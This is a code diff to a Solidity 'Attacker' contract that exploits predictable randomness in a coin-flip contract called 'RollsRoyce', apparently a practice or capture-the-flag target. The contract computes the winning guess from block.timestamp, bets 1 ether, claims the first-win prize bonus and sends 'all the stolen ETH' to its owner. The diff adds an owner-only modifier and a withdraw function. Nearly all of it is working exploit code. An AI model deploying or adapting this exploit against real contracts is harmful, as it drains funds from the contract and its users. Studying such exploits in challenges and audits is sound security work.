@@ -1,4 +1,5 @@
 pragma solidity ^0.8.0;
+
 interface IRollsRoyce {
     enum CoinFlipOption {
         HEAD,
@@ -21,9 +22,12 @@ contract Attacker {
         owner = msg.sender;
     }
 
-    function attack() external payable {
+    modifier onlyOwner() {
         require(msg.sender == owner, "Only owner can execute this function");
+        _;
+    }
 
+    function attack() external payable onlyOwner {
         // Exploit the randomness vulnerability by calculate the guess base on RollsRoyce contract logic
         IRollsRoyce.CoinFlipOption guess = IRollsRoyce.CoinFlipOption(
             uint(keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))) % 2
@@ -39,13 +43,16 @@ contract Attacker {
         rollsRoyceContract.guess{value: 1 ether}(guess);
         rollsRoyceContract.revealResults();
 
-        // Call the withdraw prize
+        // Call the withdraw prize function
         rollsRoyceContract.withdrawFirstWinPrizeMoneyBonus();
 
-        // Send all the stolen eth to the owner address
-        (bool success, ) = payable(owner).call{value: address(this).balance}(
-            ""
-        );
+        // Send all the stolen ETH to the owner address
+        (bool success, ) = owner.call{value: address(this).balance}("");
+    }
+
+    // Just an additional withdraw function allow owner to withdraw all ETH from attaker contract
+    function withdraw() external onlyOwner {
+        (bool success, ) = owner.call{value: address(this).balance}("");
     }
 
     receive() external payable {
